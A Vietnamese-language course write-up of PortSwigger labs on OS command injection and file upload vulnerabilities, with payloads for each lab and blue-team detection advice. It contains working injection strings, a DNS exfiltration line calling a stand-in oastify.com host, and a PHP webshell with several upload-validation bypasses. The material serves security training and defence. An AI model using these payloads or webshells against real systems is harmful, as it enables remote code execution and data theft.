---
id: command-injection-file-upload-labs
title: OS Command Injection & File Upload — Labs PortSwigger
sidebar_label: Command Injection & File Upload (Week 13)
sidebar_position: 6
description: Writeup 5 lab OS Command Injection và các lab File Upload trên PortSwigger — từ In-band RCE đến Blind OOB data exfiltration, bypass file type validation. OWASP A03 Injection.
---

# OS Command Injection & File Upload — Labs PortSwigger

---

## Phần A — OS Command Injection

### Lý thuyết

OS Command Injection xảy ra khi ứng dụng web nhúng trực tiếp input của người dùng vào một shell command mà không thực hiện bất kỳ bước sanitize hay escape nào trước đó. Về mặt kỹ thuật, lỗ hổng này xuất hiện khi developer sử dụng các hàm như `system()`, `exec()`, `popen()` trong C/PHP, hay `subprocess` với tham số `shell=True` trong Python, hoặc `Runtime.exec()` trong Java — tất cả đều cho phép OS shell diễn giải chuỗi lệnh. Hậu quả là kẻ tấn công đạt được **Remote Code Execution (RCE)** hoàn chỉnh trên server, nghĩa là có thể đọc bất kỳ file nào, dừng dịch vụ, tạo backdoor, hoặc pivot sang các hệ thống nội bộ.

Có ba dạng phát hiện và khai thác chính mà một SOC Analyst hoặc Penetration Tester cần nắm rõ:

- **In-band / Regular**: Output của lệnh được trả về trực tiếp trong HTTP response. Đây là dạng đơn giản nhất — kẻ tấn công chèn `; whoami` và đọc kết quả ngay trong body của response. Dễ phát hiện bằng WAF nếu được cấu hình đúng, nhưng cũng là dạng phổ biến nhất trong môi trường staging/development thiếu hardening.

- **Blind với time delay**: Response không chứa output của lệnh, server chỉ trả về thành công/thất bại. Kỹ thuật xác nhận là chèn lệnh gây độ trễ — `; ping -c 10 127.0.0.1` (Linux) hoặc `; sleep 10`. Nếu server phản hồi chậm hơn đúng 10 giây, lệnh đã được thực thi. Dạng này khó phát hiện hơn vì không có artifact rõ ràng trong response body, đòi hỏi defender phải monitor response time anomaly.

- **Blind với output redirection**: Sau khi xác nhận injection tồn tại qua time delay, kẻ tấn công redirect output của lệnh vào một file nằm trong thư mục web-accessible: `; whoami > /var/www/images/output.txt`. Tiếp theo, một GET request tới `/image?filename=output.txt` sẽ trả về nội dung file, tức là kết quả của lệnh.

- **Blind với OOB (Out-of-Band)**: Khi không có thư mục nào phù hợp để redirect và timing không ổn định, kẻ tấn công chuyển sang kênh phụ. Bằng cách chèn `nslookup attacker-id.oastify.com` hoặc `curl http://attacker-id.oastify.com`, server sẽ tự chủ động gửi DNS query hoặc HTTP request ra ngoài. Burp Collaborator (hoặc interactsh) ghi nhận request đến — đây là xác nhận RCE qua kênh hoàn toàn tách biệt với HTTP response bình thường.

Shell metacharacters là công cụ để "thoát ra" khỏi context lệnh gốc và chèn lệnh mới: `;` (tuần tự thực thi), `|` (pipe), `&&` (AND — chỉ chạy nếu lệnh trước thành công), `||` (OR — chỉ chạy nếu lệnh trước thất bại), `` ` `` và `$()` (command substitution — nhúng output của lệnh vào chuỗi khác), `%0a` (newline URL-encoded — hoạt động như `;` trong nhiều context).

---

### Writeup 5 Labs OS Command Injection

#### Lab 1: OS Command Injection — Simple Case (In-band)

**Logic:** Chức năng "Check stock" của ứng dụng nhận hai tham số `productId` và `storeId` qua POST request, rồi ghép chúng trực tiếp vào một shell command để query stock database. Không có bất kỳ filter hay sanitize nào được áp dụng. Khi chèn `; whoami` vào tham số `storeId`, server ghép chuỗi thành `stockcheck.pl <productId> 1;whoami` và thực thi qua shell. Vì đây là dạng **in-band**, output của `whoami` được trả về ngay trong HTTP response body, không cần kỹ thuật nào thêm.

**Payload:**
```
POST /product/stock HTTP/1.1
...

productId=1&storeId=1;whoami
```

**Kết quả:** Response body chứa username của web server process, xác nhận RCE.

---

#### Lab 2: Blind OS Command Injection — Time Delay

**Logic:** Chức năng feedback form nhận `email`, `name`, `subject`, `message` — tất cả được xử lý phía backend, có thể được đưa vào shell command để gửi mail. Response không tiết lộ output của bất kỳ lệnh nào, khiến in-band technique hoàn toàn vô dụng. Kỹ thuật xác nhận là **time delay**: chèn lệnh `ping` với 10 gói vào trường `email`. Nếu server phản hồi sau ~10 giây, shell đã thực thi lệnh. Dấu `||` được sử dụng để đảm bảo lệnh inject chạy bất kể lệnh gốc thành công hay thất bại.

**Payload:**
```
email=x||ping+-c+10+127.0.0.1||
```

**Kết quả:** Response bị delay khoảng 10 giây — xác nhận blind command injection.

---

#### Lab 3: Blind OS Command Injection — Output Redirection

**Logic:** Đã xác nhận injection tồn tại qua Lab 2. Mục tiêu bây giờ là đọc được kết quả thực sự của lệnh. Server phục vụ ảnh sản phẩm từ thư mục `/var/www/images/` — đây là thư mục **web-accessible** và web server process có quyền ghi vào. Redirect output của `whoami` vào file `output.txt` trong thư mục đó. Sau đó, gửi GET request tới `/image?filename=output.txt` để đọc nội dung file — chính là username của server process.

**Payload (bước 1 — inject):**
```
email=x||whoami>/var/www/images/output.txt||
```

**Payload (bước 2 — đọc kết quả):**
```
GET /image?filename=output.txt
```

**Kết quả:** Response trả về username, ví dụ `peter-wiener` hoặc `www-data`.

---

#### Lab 4: Blind OS Command Injection — OOB Interaction

**Logic:** Không có thư mục web-accessible phù hợp để redirect output, và timing signal không đủ ổn định để kết luận. Chuyển sang kỹ thuật **Out-of-Band**: chèn lệnh `nslookup` tới domain của Burp Collaborator. Khi server thực thi lệnh, OS sẽ gửi DNS query ra ngoài. Burp Collaborator (tại `attacker-id.oastify.com`) ghi nhận DNS lookup — đây là bằng chứng server đã chạy lệnh, hoàn toàn độc lập với HTTP response.

**Payload:**
```
email=x||nslookup+attacker-id.oastify.com||
```

**Kết quả:** Burp Collaborator nhận DNS query từ IP của server target — xác nhận OOB interaction thành công.

---

#### Lab 5: Blind OS Command Injection — OOB Data Exfiltration

**Logic:** Đây là kỹ thuật nâng cao nhất — không chỉ xác nhận injection mà còn **trích xuất data thực** qua kênh OOB. Dùng **command substitution** (backtick hoặc `$(...)`) để nhúng kết quả của `whoami` vào subdomain của DNS query. Khi server thực thi, OS giải quyết command substitution trước, lấy output của `whoami` (ví dụ `peter`), sau đó gửi DNS query tới `peter.attacker-id.oastify.com`. Collaborator thấy được subdomain — subdomain chính là data đã bị exfiltrate.

**Payload:**
```
email=x||nslookup+`whoami`.attacker-id.oastify.com||
```

**Kết quả:** Collaborator nhận query tới `[username].attacker-id.oastify.com`. Username của server process bị lộ hoàn toàn qua DNS.

---

### Góc nhìn Red/Blue Team — Command Injection

**Red Team perspective:** Command injection thường ẩn trong các tính năng ít được kiểm thử như hidden stock check API, cron job trigger endpoint, log export function, hay email notification handler. Những nơi này thường ít được review code kỹ vì không phải user-facing primary feature. OOB technique đặc biệt hữu ích khi target nằm sau WAF chặt — WAF không thể thấy DNS query ra ngoài.

**Blue Team perspective:** Dấu hiệu cần monitor trong SIEM/Wazuh:
- **Process tree anomaly**: Web server process (Apache2, Nginx, Tomcat) không bao giờ nên spawn `bash`, `sh`, `cmd.exe` trong điều kiện bình thường. Alert ngay khi thấy process tree: `apache2 → bash → whoami/id/curl`.
- **Wazuh FIM**: Monitor thư mục `/var/www/images/`, `/tmp/`, `/var/tmp/` — alert khi có file mới xuất hiện với extension bất thường hoặc nội dung đáng ngờ.
- **Network egress**: Web server process gửi DNS query hoặc HTTP request tới domain bên ngoài là cực kỳ bất thường. Firewall egress rule + SIEM alert.
- **OSSEC rule level 12+**: Khi web server process spawn unexpected child process.
- **Response time baseline**: Nếu một endpoint cụ thể đột ngột có response time tăng 10 giây — có thể là time-based blind injection đang được thăm dò.

---

## Phần B — File Upload Vulnerabilities

### Lý thuyết

File Upload Vulnerability xảy ra khi ứng dụng cho phép người dùng upload file mà không validate đúng cách loại file, nội dung, hay đường dẫn lưu trữ. Hậu quả nghiêm trọng nhất là kẻ tấn công upload được **webshell** (file `.php`, `.jsp`, `.aspx` chứa code thực thi lệnh) và server execute file đó khi có request tới — đây là con đường nhanh nhất để đạt RCE thông qua giao diện web.

Điều quan trọng cần hiểu: ứng dụng có thể implement nhiều lớp validation, nhưng mỗi lớp validation đều có thể bị bypass bằng kỹ thuật tương ứng:

- **MIME type spoofing**: Server chỉ kiểm tra header `Content-Type` do client gửi lên mà không kiểm tra nội dung thực của file. Kẻ tấn công gửi `Content-Type: image/jpeg` trong khi body thực sự là PHP webshell. Server tin vào header và lưu file.

- **Extension blacklist bypass**: Blacklist chỉ chặn `.php` nhưng Apache/Nginx vẫn có thể execute các extension khác như `.php5`, `.phtml`, `.phar`, `.shtml`, `.php7`. Ít nhất một trong số này thường vắng mặt trong blacklist.

- **Null byte injection**: `shell.php%00.jpg` — một số framework cắt tên file tại null byte khi lưu xuống filesystem (C-string behavior), kết quả file được lưu thành `shell.php` dù validation nhìn thấy extension `.jpg`.

- **Double extension**: `shell.jpg.php` — nếu server lấy extension cuối cùng để quyết định execute, file vẫn bị execute như PHP.

- **Magic bytes spoofing**: Thêm signature `GIF89a;` ở đầu file PHP — validator kiểm tra magic bytes thấy đây là GIF hợp lệ, nhưng PHP interpreter vẫn execute phần code PHP phía sau.

- **Path traversal trong filename**: Đặt tên file trong multipart request là `../../../var/www/html/shell.php`. Nếu server không sanitize filename trước khi lưu, file được lưu ra ngoài upload directory vào web root, truy cập được qua `/shell.php`.

- **Race condition**: Upload file hợp lệ → server lưu tạm → validate → xóa nếu không hợp lệ. Nếu khoảng thời gian giữa lưu tạm và xóa đủ dài, kẻ tấn công có thể GET file trước khi server xóa.

---

### Writeup Labs File Upload

#### Lab: Basic Webshell Upload (No Validation)

**Logic:** Chức năng upload avatar không implement bất kỳ validation nào — không check extension, không check Content-Type, không check nội dung file. Đây là worst-case scenario về file upload security. Upload trực tiếp file PHP webshell, server lưu vào `/files/avatars/` và serve file đó khi có request. GET request với query parameter `cmd` sẽ truyền lệnh vào `shell_exec()`.

**Payload (shell.php):**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

**Truy cập:**
```
GET /files/avatars/shell.php?cmd=whoami
```

**Kết quả:** Server trả về username — RCE hoàn chỉnh thông qua webshell.

---

#### Lab: Bypass Content-Type Validation

**Logic:** Server thực hiện một validation: kiểm tra header `Content-Type` của file được upload. Nếu không phải `image/jpeg` hoặc `image/png`, request bị từ chối. Tuy nhiên, server **không** kiểm tra nội dung thực sự của file. Sử dụng Burp Suite để intercept request upload, giữ nguyên body (PHP code) nhưng thay đổi `Content-Type` từ `application/x-php` thành `image/jpeg`. Server chấp nhận file và lưu lại, sau đó execute khi fetch.

**Intercept và sửa header:**
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo shell_exec($_GET['cmd']); ?>
```

**Kết quả:** File PHP được lưu thành công. GET request tới file trả về output lệnh.

---

#### Lab: Blacklist Bypass với Obscure Extension

**Logic:** Server có blacklist chặn `.php`. Khi upload file với extension `.php`, request bị reject. Tuy nhiên, blacklist không đầy đủ — không bao gồm các alternative PHP extensions mà Apache vẫn xử lý như PHP. Thử lần lượt `.php5`, `.phtml`, `.phar`. Ít nhất một extension không có trong blacklist, file được upload và server execute khi có GET request.

**Payload:** Đổi tên file từ `shell.php` thành `shell.php5` (hoặc `shell.phtml`) trước khi upload.

**Kết quả:** File được accept và execute — blacklist bypass thành công.

---

#### Lab: Bypass với Polyglot File (Magic Bytes)

**Logic:** Server implement magic byte validation — đọc một số byte đầu tiên của file và so sánh với signature của JPEG/PNG thực sự, thay vì chỉ tin vào Content-Type header hay extension. Kỹ thuật bypass: tạo **polyglot file** — file vừa có valid magic bytes của GIF (`GIF89a;`) ở đầu, vừa chứa PHP code sau đó. Validator thấy magic bytes hợp lệ → chấp nhận file. Khi server PHP parse file theo request, interpreter bỏ qua phần GIF header và execute phần PHP code.

**Payload (polyglot shell):**
```
GIF89a;
<?php echo shell_exec($_GET['cmd']); ?>
```

**Kết quả:** File qua validator magic byte, server execute PHP code trong file — bypass hoàn toàn.

---

#### Lab: Path Traversal trong Filename

**Logic:** Server validate extension và Content-Type đúng cách, nhưng không sanitize `filename` trong multipart body trước khi sử dụng để lưu file. Kẻ tấn công đặt filename là `../../../var/www/html/shell.php` — khi server nối upload directory với filename này, path traversal đưa file ra khỏi upload folder vào web root. File được đặt trực tiếp tại `/var/www/html/shell.php`, truy cập qua `/shell.php` mà không cần biết đường dẫn upload.

**Payload (trong multipart body):**
```
Content-Disposition: form-data; name="avatar"; filename="../../../var/www/html/shell.php"
Content-Type: image/jpeg

<?php echo shell_exec($_GET['cmd']); ?>
```

**Kết quả:** File được lưu ra ngoài upload directory. `GET /shell.php?cmd=id` trả về RCE.

---

### Góc nhìn Blue Team — File Upload

Webshell detection là một trong những use case cốt lõi của SOC:

- **Wazuh FIM (File Integrity Monitoring)**: Cấu hình monitor toàn bộ thư mục `/var/www/` và subdirectory. Alert ngay khi có file mới với extension `.php`, `.jsp`, `.aspx`, `.phtml` xuất hiện — đặc biệt nếu file được tạo bởi web server process (không phải deployment script).

- **Process monitoring**: Web server process (Apache, Nginx, Tomcat, IIS) không bao giờ nên spawn `bash`, `sh`, `cmd.exe`, `powershell.exe` trong hoạt động bình thường. Nếu process tree cho thấy `httpd → bash → id` hoặc `w3wp.exe → cmd.exe`, đây là IOC mạnh của webshell execution.

- **Network egress**: Webshell thường được dùng để thiết lập reverse shell. Monitor egress connection từ web server process ra ngoài — kết nối TCP outbound tới port bất thường từ `apache2` là red flag.

- **SIEM correlation rule**: Kết hợp ba sự kiện: (1) File upload event tới endpoint nhất định, (2) Ngay sau đó có GET/POST request tới file vừa upload, (3) Response có kích thước bất thường hoặc chứa pattern giống command output. Ba sự kiện liên tiếp trong khoảng thời gian ngắn → alert webshell execution.

- **Content inspection**: Nếu có giải pháp IDS/proxy nội bộ, inspect nội dung file upload để tìm PHP open tag `<?php`, JSP scriptlet `<% %>`, hay pattern `eval(`, `base64_decode(`, `shell_exec(`.

---

## Tổng kết: Command Injection và File Upload trong bức tranh OWASP 2025

Cả OS Command Injection và File Upload Vulnerability đều được phân loại dưới **OWASP A03:2021 — Injection**, và trong bối cảnh OWASP 2025, đây vẫn là hai vector tấn công dẫn đến hậu quả nghiêm trọng nhất: **Remote Code Execution**. Điểm chung cốt lõi của cả hai là việc ứng dụng **trust user input** — tin vào những gì người dùng gửi lên mà không đặt câu hỏi về tính toàn vẹn và an toàn của dữ liệu đó.

Với Command Injection, ứng dụng tin rằng input người dùng chỉ là data vô hại sẽ được nhúng vào lệnh shell. Với File Upload, ứng dụng tin rằng file người dùng upload thực sự là image hay document vô hại dựa trên những tín hiệu dễ giả mạo như Content-Type header hay extension.

Nguyên tắc phòng thủ áp dụng cho cả hai:

1. **Never trust user input**: Mọi dữ liệu từ client đều phải bị nghi ngờ — validate, sanitize, escape trước khi sử dụng.
2. **Server-side validation là bắt buộc**: Client-side validation chỉ là UX, không phải security. Kẻ tấn công luôn bypass client-side với Burp Suite.
3. **Principle of Least Privilege**: Web server process không nên chạy với quyền root. Nếu bị compromise, attacker chỉ có quyền của `www-data` thay vì root — giảm thiểu blast radius đáng kể.
4. **Chroot / Container isolation**: Chạy web application trong container (Docker) hoặc chroot jail. Kể cả khi attacker đạt RCE, họ bị giới hạn trong môi trường sandbox — không thể trực tiếp tác động đến host OS hay các service khác.
5. **Parameterized API thay vì shell command**: Thay `system("stockcheck " + productId)` bằng API call trực tiếp đến service. Loại bỏ hoàn toàn shell làm intermediary.
6. **File execution isolation**: Upload directory không được phép execute script. Cấu hình Apache/Nginx deny execute permission trên thư mục upload — kể cả upload được webshell, server cũng không execute.

Hiểu sâu về cả attack technique và defense mechanism là điều phân biệt một SOC Analyst giỏi — không chỉ biết alert nào cần attention, mà còn hiểu tại sao attack thành công và làm thế nào để ngăn chặn nó ngay từ root cause.
